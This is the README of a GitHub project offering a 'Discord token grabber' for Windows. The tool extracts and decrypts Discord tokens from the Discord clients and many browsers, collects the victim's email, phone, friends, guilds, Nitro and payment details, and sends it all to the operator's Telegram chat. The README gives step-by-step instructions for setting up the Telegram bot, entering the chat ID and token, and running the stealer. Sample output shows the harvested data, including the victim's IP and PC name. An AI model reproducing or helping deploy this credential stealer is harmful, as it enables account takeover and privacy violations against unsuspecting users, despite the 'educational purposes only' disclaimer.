# Discord Token Grabber with Telegram Integration

This Python script extracts Discord tokens from various applications on a Windows machine, retrieves user information (e.g., Nitro status, friends, guilds), and sends the data to a Telegram chat via the Telegram API.

> **⚠️ Warning**: This script accesses sensitive information (e.g., Discord tokens, payment methods). Use it responsibly and legally. Unauthorized use may violate Discord's Terms of Service and local laws.

## Features

- Extracts Discord tokens from multiple platforms (e.g., Discord, Chrome, Brave).
- Decrypts tokens using Windows CryptUnprotectData and AES-GCM.
- Fetches user details from Discord API (e.g., email, phone, Nitro, guilds).
- Sends data to a Telegram chat with a user avatar photo.

## Supported Platforms

- Discord, Discord Canary, Discord PTB, Lightcord
- Chrome, Chrome SxS, Microsoft Edge, Brave, Yandex, Vivaldi, etc.
- Opera, Opera GX, Amigo, Torch, Kometa, Orbitum, etc.

## Prerequisites

- **Operating System**: Windows only (script checks for `os.name == "nt"`).
- **Python**: Version 3.x installed.
- **Telegram Bot**: A Telegram bot token and chat ID to receive data.

## Installation

1. **Clone the Repository**:

```bash
   git clone https://github.com/csosfzonu/Discord_token_grabber.git
```

2. **Install Dependencies**:
   The script automatically installs missing modules (`pypiwin32`, `pycryptodome`) on first run. Alternatively, install them manually:
   pip install pypiwin32 pycryptodome requests bcrypt

3. **Telegram Bot Setup Guide**

**Step 1: Create a Telegram Bot**

3.1 Open **BotFather** on Telegram by visiting [https://t.me/BotFather](https://t.me/BotFather).  
3.2 Type `/newbot` in the chat to start creating your bot.  
3.3 Follow BotFather’s instructions to set a **name** and **username** for your bot.  
3.4 After creation, you’ll get a **Bot Token**. Copy and save it somewhere safe!  
3.5 Example Token: `12345:ABCDEF...` _(Yours will be longer!)_

**Step 2: Get Your Channel ID**

3.6 Add your bot to the target channel as an **administrator**.  
3.7 Take this URL: `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`

- Swap `<YOUR_BOT_TOKEN>` with your actual token.
- Example: If your token is `12345:ABCDEF...`, it becomes:
- https://api.telegram.org/bot12345:ABCDEF.../getUpdates

  3.8 Open that URL in your browser (e.g., Chrome).  
  3.9 Send a quick message in the channel where your bot is added.  
  3.10 Reload the browser page. You’ll see a JSON response—find the `chat` section:

- Look for: `"id"`
- That’s your **Channel ID**!

```json
{
  "ok": true,
  "result": [
    {
      "update_id": 123456789,
      "channel_post": {
        "message_id": 1,
        "chat": {
          "id": "This is your channel id.",
          "title": "Your Channel Name",
          "type": "channel"
        },
        "date": 1698765432,
        "text": "Hello"
      }
    }
  ]
}
```

**Notes**
Ensure your bot is added to the channel as an admin.
If no updates appear, send another message and refresh again.

## Usage

1. **Edit the Script**:

- Open `main.py`.
- Replace the chat_id in the data dictionary with your Telegram chat ID: **Line 198**

  ```python
  "chat_id": "your_chat_id",
  ```

  Replace the Telegram bot token placeholder **Line 216**

  ```python
  if __name__ == "__main__":
      main("Your_teleram_bot_token")
  ```

2. **Run the Script:**

```bash
    python main.py
```

## Example Output in Telegram

```markdown
User ID: 123456789
Email: user@example.com
Phone Number: +1234567890
Friends: 42
Guilds: 15
Admin Permissions:

- [Server Name]: 5000 members; .gg/invite
  MFA Enabled: True
  Flags: 256
  Locale: en-US
  Verified: True
  Nitro Informations:
  Has Nitro: True
  Expiration Date: 31/12/2023 at 23:59:59
  Boosts Available: 2 - Available now - Available on 01/01/2024 at 12:00:00
  IP: 192.168.1.1
  Username: WindowsUser
  PC Name: DESKTOP-ABC123
  Token Location: Discord
  Token: [Spoiler-hidden token]
```

## Configuration

- **Custom Chat ID**: Edit chat_id in the data dictionary to send to a different Telegram chat.
- **Custom Photo**: Modify get_image() to change avatar size or use a different image URL.
- **Add Platforms**: Extend the PATHS dictionary to support more applications.

## Security Notes

- **Token Exposure**: The script sends the Discord token in a Telegram message (hidden with <tg-spoiler>). Ensure your Telegram chat is private and secure.
- **Local Storage**: Tokens are extracted from Local Storage\leveldb. Avoid running on shared or untrusted machines.
- **Encryption**: Tokens are decrypted using Windows DPAPI and AES-GCM. Keep your system secure to prevent key leaks.

## Troubleshooting

- **Permission Denied**: Run as Administrator.

- **Telegram Errors**: Verify bot token and chat ID if sendPhoto fails (check res.json() output).
- **Module Issues**: Ensure internet connection for auto-install.

## License

- **Unlicensed**. Use at your own risk.

## Disclaimer

- For educational purposes only. The author is not liable for misuse or consequences.

```

```

```

```
